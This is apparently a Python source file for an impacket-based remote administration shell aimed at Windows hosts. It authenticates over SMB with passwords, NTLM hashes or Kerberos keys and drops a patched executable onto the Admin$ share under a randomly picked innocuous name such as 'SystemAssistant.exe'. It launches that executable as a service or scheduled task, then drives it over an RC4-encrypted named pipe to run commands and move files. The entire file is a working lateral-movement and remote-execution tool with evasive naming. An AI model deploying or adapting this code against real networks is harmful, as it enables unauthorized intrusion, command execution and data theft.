from typing import Optional
from impacket.smbconnection import SMBConnection
from impacket.internal_helpers.bofpack import BofPack, BofUnpack
from impacket.internal_helpers.Utility import get_encryption_key, resolve_share
from impacket.examples import logger
from impacket.examples.utils import parse_target
from dataclasses import dataclass
from examples.services import SVCCTL
from examples.atexec import TSCH_EXEC
from struct import unpack
from io import BytesIO
import ntpath
import importlib.resources._legacy
from impacket import version
import itertools
import logging
import socket
import time
import random
import cmd2
import sys
import argparse
import traceback
from types import SimpleNamespace
import functools
import os
from rich.progress import Progress
from Cryptodome.Cipher import ARC4

#TODO: Add in RC4 Encryption Layer | DONE
# Check for randomized key, if it does not exist, ask if one should be made Generate a randomized key, store in home direcotry
#TODO: Patch the used pipe name | DONE
#TODO: Scheduled Task deployment
#TODO: Service Deployment
        #TODO: add validation of all potentially used args in main

used_method = None

exe_names = ["SystemAssistant.exe",
    "DataProcessor.exe",
    "MaintenanceManager.exe",
    "NetworkServices.exe",
    "ResourceAllocator.exe",
    "ServiceHandler.exe",
    "TaskCoordinator.exe",
    "EventLogger.exe",
    "FileOrganizer.exe",
    "ArchiveManager.exe",
    "Configurator.exe",
    "DiagnosticTool.exe",
    "ExecutionManager.exe",
    "InformationHub.exe",
    "OperationPlanner.exe",
    "QualityAssurance.exe",
    "ResourceMonitor.exe",
    "SystemOptimizer.exe",
    "DataSyncManager.exe",
    "NetworkAnalyzer.exe",
    "WorkflowEngine.exe",
    "ProcessAuditor.exe",
    "MemoryManager.exe",
    "DiskScanner.exe",
    "UserSupportTool.exe",
    "ConnectionManager.exe",
    "SystemScanner.exe",
    "DocumentManager.exe",
    "DeviceManager.exe",
    "UserActivityMonitor.exe",
    "CloudSyncAssistant.exe"]



@dataclass
class commandenum:
    SHELL = 0
    PROCESS = 1
    BACKGROUNDPROCESS = 2
    UPLOAD = 3
    DOWNLOAD = 4
    EXIT = 5
    LS = 6
    ECHO = 99
    
keydata = None
deployed = False
keyindex = b'\xef\xdc\xa5\x059W\xa7\xfbFP-\x07\xeev\xa9\xd0\xf0\x7f\xe9\xb5\xb9\xbdbW\xf3c\xd7\xda\x89\x17t\x15\x155\xa0\xd9\x92\xe4\x12\x80'
pipeindex = b'A' * 128
exename = None

execute_parser = cmd2.Cmd2ArgumentParser()
execute_parser.add_argument('command', help="Command to execute on target")
execute_parser.add_argument('-t', '--timeout', type=int, default=30, help="number of seconds to wait for shell / process to finish")

upload_parser = cmd2.Cmd2ArgumentParser()
upload_parser.add_argument('source_file', type=argparse.FileType('rb'), help="File to upload to target")
upload_parser.add_argument('destination_path', type=str, help="path on target to upload file to")

download_parser = cmd2.Cmd2ArgumentParser()
download_parser.add_argument('source_file', type=str, help="File path on target system you want to download")
download_parser.add_argument('destination_path', type=argparse.FileType('wb'), help="File to write on our host")

ls_parser = cmd2.Cmd2ArgumentParser()
ls_parser.add_argument('path', nargs="+", type=str, help="target side path to list directory.  supports * in filename portion. Must use full paths");

class RemoteShell(cmd2.Cmd):
    def __init__(self,domain, username, password, address, options):
        super().__init__(allow_cli_args=False);
        self.nextcmdid =  itertools.count(1).__next__
        self.cmdid = None
        self.options = options
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.aesKey = options.aesKey
        self.doKerberos = options.k
        self.kdcHost = options.dc_ip
        self.client = SMBConnection(options.target, options.target_ip)
        self.target_ip = options.target_ip
        self.target = address
        self.prompt = 'RemoteShell ' + options.target_ip + '> '
        self.tree_id = None
        self.file_id = None
        self.rc4 = None
        self.pipe_name = options.pipename #TODO: This will end up need to get changed based on what we patch in / have stored
        if(options.hashes is not None):
            self.lmhash, self.nthash = options.hashes.split(':')

    def start(self):
        if(self.doKerberos):
            self.client.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                      self.aesKey, self.kdcHost)
        else:
            self.client.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
        logging.debug(" Logged in")
        if(self.options.runastask):
            logging.info(" Attempting to deploy task exe")
            self.deploy_task(self.options.rpc_backend)
        if(self.options.runassvc):
            logging.info(" Attempting to deploy svc exe")
            self.deploy_svc(self.options.rpc_backend)
        self.cmdloop(None)
        

    def startcmd(self):
        self.tree_id = self.client.connectTree("IPC$")
        self.file_id = self.client.openFile(self.tree_id, self.pipe_name)
        logging.debug(" Connected to named pipe")
        self.packer = BofPack()
        self.cmdid = self.nextcmdid()
        self.packer.addint(self.cmdid)

    def postcmd(self, stop: bool, line: str) -> bool:
        if self.file_id is not None:
            self.client.closeFile(self.tree_id, self.file_id)
            self.file_id = None
        if self.tree_id is not None:
            self.client.disconnectTree(self.tree_id)
            self.tree_id = None
        logging.debug(" Disconnected from named pipe")
        return super().postcmd(stop, line)
    
    def sendmsg(self, enc=None):
        message = self.packer.getbuffer(encryptor= enc if enc is not None else ARC4.new(keydata))
        self.client.writeFile(self.tree_id, self.file_id, message)

    #read off and returns the cmdid
    def readmsg(self, dec=None) -> (int, BofUnpack):
        msgSize = unpack("<L",  self.client.readFile(self.tree_id, self.file_id, 0, 4))[0]
        data = self.client.readFile(self.tree_id, self.file_id, 0, msgSize)
        reader = BofUnpack(data, msgSize,decryptor= dec if dec is not None else ARC4.new(keydata))
        cmdid = reader.readint()
        return (cmdid, reader)
    
    def do_echo(self, line):
        self.startcmd()
        self.packer.addint(commandenum.ECHO)
        self.packer.addstr(line)
        self.sendmsg()
        ret_cmdid, reader = self.readmsg()
        if(ret_cmdid != self.cmdid):
            logging.warn("[-] our command id doesn't match what we sent, somethings up")
        reply = reader.readstr()
        print(reply)


    def send_execute_command(self, command, timeout, background):
        self.startcmd()
        self.packer.addint(commandenum.SHELL if not background else commandenum.BACKGROUNDPROCESS)
        self.packer.addint(timeout)
        self.packer.addstr(command)
        logging.debug(f' cmd: {command}\n[+] timeout: {timeout}\n[+] background: {background}')
        self.sendmsg()
        ret_cmdid, reader = self.readmsg()
        if(ret_cmdid != self.cmdid):
            logging.warn("[-] our command id doesn't match what we sent, somethings up")
        status = reader.readint()
        if(status == 0):
            print(f"[-] Execution failed: {reader.readstr()}")
        else:
            print(f"[+] Success:\n{reader.readstr()}")

    @cmd2.with_argparser(execute_parser)
    def do_shell(self, args):
        cmd = f"cmd.exe /r {args.command}"
        self.send_execute_command(cmd, args.timeout, False)

    @cmd2.with_argparser(execute_parser)
    def do_process(self, args):
        self.send_execute_command(args.command, args.timeout, False)

    @cmd2.with_argparser(execute_parser)
    def do_backgroundprocess(self, args):
        self.send_execute_command(args.command, args.timeout, True)

    @cmd2.with_argparser(upload_parser)
    def do_upload(self, args):
        self.startcmd()
        self.packer.addint(commandenum.UPLOAD)
        self.packer.addstr(args.destination_path)
        self.packer.addBinary(args.source_file.read())
        args.source_file.close()
        self.sendmsg()
        ret_cmdid, reader = self.readmsg()
        if(ret_cmdid != self.cmdid):
            logging.warn("[-] our command id doesn't match what we sent, somethings up")
        status = reader.readint()
        if(status == 0):
            msg = reader.readstr()
            print(f'[-] upload file failed on target: {msg}')
        else:
            print(f'[+] upload success!')

    def complete_upload(self, text, line, begidx, endidx):
        return cmd2.Cmd.path_complete(self, text, line, begidx, endidx)

    #Will need to make / maintain its own rc4 decryptor for the whole file
    @cmd2.with_argparser(download_parser)
    def do_download(self, args):
        self.startcmd()
        self.packer.addint(commandenum.DOWNLOAD)
        self.packer.addstr(args.source_file)
        self.sendmsg()
        decryptor = ARC4.new(keydata)
        ret_cmdid, reader = self.readmsg(decryptor)
        if(ret_cmdid != self.cmdid):
            logging.warn("[-] our command id doesn't match what we sent, somethings up")
        status = reader.readint()
        if(status == 0):
            msg = reader.readstr()
            print(f'[-] download file failed on target: {msg}')
        else:
            file_size = reader.readqword()
            read = 0
            chunk = 16348
            with Progress() as progress:
                dl_progress = progress.add_task("[green]Downloading...", total = file_size)
                data = self.client.readFile(self.tree_id, self.file_id, 0, chunk)
                while(len(data) > 0 and read < file_size):
                    data = decryptor.decrypt(data)
                    read += len(data)
                    progress.update(dl_progress, completed=read)
                    args.destination_path.write(data)
                    if(read == file_size):
                        break
                    data = self.client.readFile(self.tree_id, self.file_id, 0, chunk)

    @cmd2.with_argparser(ls_parser)
    def do_ls(self, args):
        self.startcmd()
        self.packer.addint(commandenum.LS)
        self.packer.addstr(" ".join(args.path))
        self.sendmsg()
        ret_cmdid, reader = self.readmsg()
        if(ret_cmdid != self.cmdid):
            logging.warn("[-] our command id doesn't match what we sent, somethings up")
        status = reader.readint()
        msg = reader.readstr()
        if(status == 0):
            print(f'[-] File listing failed on target: {msg}')
        else:
            print(f'[+] Success: \n{msg}')

    def send_exit_cmd(self):
        self.startcmd()
        self.packer.addint(commandenum.EXIT)
        self.sendmsg()
        #we intentionally are not reading response
        logging.info("Send exit command to agent")
        
    def deploy_file(self, issvc):
        if self.options.resolvedsharefolderpath is None:
            logging.debug(' Resolving share disk path')
            try:
                sharepath = resolve_share(self.options.sharename, self.client.getRemoteName(), self.username, self.password, self.domain,
                                        self.lmhash, self.nthash, self.aesKey, doKerberos=self.doKerberos, kdcHost=self.kdcHost)
            except socket.gaierror:
                logging.debug(' Got address error, falling back to ip resolution')
                sharepath = resolve_share(self.options.sharename, self.client.getRemoteHost(), self.username, self.password, self.domain,
                                        self.lmhash, self.nthash, self.aesKey, doKerberos=self.doKerberos, kdcHost=self.kdcHost)
        else:
            sharepath = self.options.resolvedsharefolderpath
        logging.debug(f' resolved share path is {sharepath}')
        with importlib.resources._legacy.path('impacket.internal_helpers', 'RemoteMaint.exe' if not issvc else 'RemoteMaintsvc.exe') as remoteexe:
            with open(remoteexe, 'rb') as fp:
                exe_data = fp.read()
        if(exe_data.find(keyindex) == -1 or exe_data.find(pipeindex) == -1):
            logging.critical(' Could not find replacement values in exe, bailing')
            sys.exit(1) 
        exe_data = exe_data.replace(keyindex, keydata)
        pipe_name = f"\\\\.\\pipe\\{self.options.pipename}"
        exe_data = exe_data.replace(pipeindex, pipe_name.encode('utf-8').ljust(128, b'\0'))
        exe_stream = BytesIO(exe_data)
        logging.info(f"uploading to path {ntpath.join(self.options.sharename,self.options.sharefolderpath, self.options.exename)}")
        self.client.putFile(self.options.sharename, 
                            ntpath.join(self.options.sharefolderpath, self.options.exename),
                            exe_stream.read)
        return ntpath.join(sharepath, self.options.sharefolderpath, self.options.exename)

    def deploy_svc(self, method, exe_existing_path=None):
        connect_method = method if method != 'auto' else 'tcp'
        if exe_existing_path is None:
            exe_path = self.deploy_file(True)
        else:
            exe_path = exe_existing_path
        try:
            svc_options = SimpleNamespace(action='create', name=self.options.svcname, display=self.options.svcname, path=exe_path,
                                        aesKey=self.options.aesKey, k=self.options.k, dc_ip=self.options.dc_ip, hashes=self.options.hashes,
                                        rpc_backend=connect_method )
            svctl = SVCCTL(self.username, self.password, self.domain, svc_options)
            svctl.run(self.client.getRemoteName(), self.client.getRemoteHost())
            svc_options = SimpleNamespace(action='start', name=self.options.svcname,
                                    aesKey=self.options.aesKey, k=self.options.k, dc_ip=self.options.dc_ip, hashes=self.options.hashes,
                                    rpc_backend=connect_method )
            svctl = SVCCTL(self.username, self.password, self.domain, svc_options)
            svctl.run(self.client.getRemoteName(), self.client.getRemoteHost())
            global used_method
            used_method = connect_method
        except OSError as e:
            if method == 'auto':
                self.deploy_svc('smb', exe_path)
            else:
                traceback.print_exc()
                logging.critical(' Failed to create / start service, attempting to delete service exe')
                self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))
                self.do_exit('', True)
        except Exception as e:
            traceback.print_exc()
            logging.critical(" Unhandled error, attempting to delete service exe")
            self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))
            self.do_exit('', True)

    def deploy_task(self, method, exe_existing_path=None):
        connect_method = method if method != 'auto' else 'tcp'
        if exe_existing_path is None:
            exe_path = self.deploy_file(False)
        else:
            exe_path = exe_existing_path
        try:
            ts_options = SimpleNamespace(k=self.options.k, rpc_backend=connect_method, taskname=self.options.taskpath)
            tsctl = TSCH_EXEC(self.username, self.password, self.domain, self.options.hashes, self.options.aesKey,
                              self.options.k, self.options.dc_ip, exe_path, None, True, ts_options)
            tsctl.play(self.client.getRemoteName() if self.options.k else self.client.getRemoteHost())
        except OSError as e:
            if method == 'auto':
                self.deploy_task('smb', exe_path)
            else:
                traceback.print_exc()
                logging.critical(' Failed to create task, attempting to delete exe')
                self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))
                self.do_exit('', True)
        except Exception as e:
            traceback.print_exc()
            logging.critical(" Unhandled error, attempting to delete task exe")
            self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))
            self.do_exit('', True)

    def do_send_exit_exe_cmd(self, line):
        logging.info("asking far end exe to exit, any further commands will fail without redeploying")
        self.send_exit_cmd()


    def cleanup_svc(self):
        if used_method is not None:
            try:
                svc_options = SimpleNamespace(action='stop', name=self.options.svcname,
                                            aesKey=self.options.aesKey, k=self.options.k, dc_ip=self.options.dc_ip, hashes=self.options.hashes,
                                            rpc_backend=used_method)
                svctl = SVCCTL(self.username, self.password, self.domain, svc_options)
                svctl.run(self.client.getRemoteName(), self.client.getRemoteHost())
                time.sleep(2)
                svc_options = SimpleNamespace(action='delete', name=self.options.svcname,
                                            aesKey=self.options.aesKey, k=self.options.k, dc_ip=self.options.dc_ip, hashes=self.options.hashes,
                                            rpc_backend=used_method)
                svctl = SVCCTL(self.username, self.password, self.domain, svc_options)
                svctl.run(self.client.getRemoteName(), self.client.getRemoteHost())
            except Exception as e:
                traceback.print_exc()
                logging.critical(' Service cleanup failed, you will need to manually delete the service if it still exists')
            finally:
                self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))


    def cleanup_task(self):
        #tsch_exec already deleted the task if it could, we just need to remove exe
        self.client.deleteFile(self.options.sharename, ntpath.join(self.options.sharefolderpath, self.options.exename))

    def do_exit(self, line, error=False):

        if (not self.options.donotcleanup) and (self.options.runastask or self.options.runassvc) and not error:
            if self.options.runassvc:
                self.cleanup_svc()
            else:
                self.send_exit_cmd()
                logging.info('Waiting to delete task for 10 seconds')
                time.sleep(10)
                self.cleanup_task()

        self.client.close()
        sys.exit(1)

    def do_quit(self, line):
        self.do_exit(line)

    def do_EOF(self, line):
        self.do_exit(line)




def main():
        # Init the example's logger theme
    logger.init()
    parser = argparse.ArgumentParser(add_help = True, description = "SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('pipename', help="pipename to use when connecting to target.  When used with a deployment method it is the named pipe our exe will listen on.")
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the mini shell')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-keyfile', type=argparse.FileType('rb'), default=None, help="Keyfile to override home config with and use when connecting, useful if multiple users are targeting the same endpoint")

    group = parser.add_argument_group('deployment', 'specify one of these flags when deploying to a new server')
    group.add_argument('-sharename', default='Admin$', help='name of a share to use when deploying our binary')
    group.add_argument('-resolvedsharefolderpath', default=None, help='if provided don\'t use wmi to resolve share, just use this value')
    group.add_argument('-sharefolderpath', default='', help='Path relative to share base where we will place our exe, placed direct in share base if not given')
    group.add_argument('-donotcleanup', action='store_true', help='After exiting the shell session do not clean up the task or service used to create it')
    group.add_argument('-exename', help='name of our exe to run as on target, randomized if not provided')
    group.add_argument('-rpc-backend', choices=['smb', 'tcp', 'auto'], nargs='?', default='auto', help='force a specific connection method, auto tries what is thought to be best and falls back if it fails')
    meg = group.add_mutually_exclusive_group()
    meg.add_argument('-runastask', action='store_true', help='Deploy and run the exe as a scheduled task')
    meg.add_argument('-runassvc', action='store_true', help='Deploy and run the exe as a service')

    group = parser.add_argument_group('scheduled task', 'These options are required when deploying as a scheduled task')
    group.add_argument('-taskpath', help='Full path to scheduled task to create')
    
    group = parser.add_argument_group('service', 'These options are required when deploying as a service')
    group.add_argument('-svcname', help='name of service to deploy as')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)
    global keydata
    if options.keyfile is None:
        keydata = get_encryption_key()
    else:
        keydata = options.keyfile.read()
        options.keyfile.close()

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if(options.runassvc):
        if options.svcname is None:
            logging.critical("you must specify a service name w/ -svcname when deploying as a service")
            sys.exit(1)

    if options.exename is None:
        options.exename = random.choice(exe_names)
        

    shell = RemoteShell(domain, username, password, address, options)
    shell.start()


if __name__=="__main__":
    main()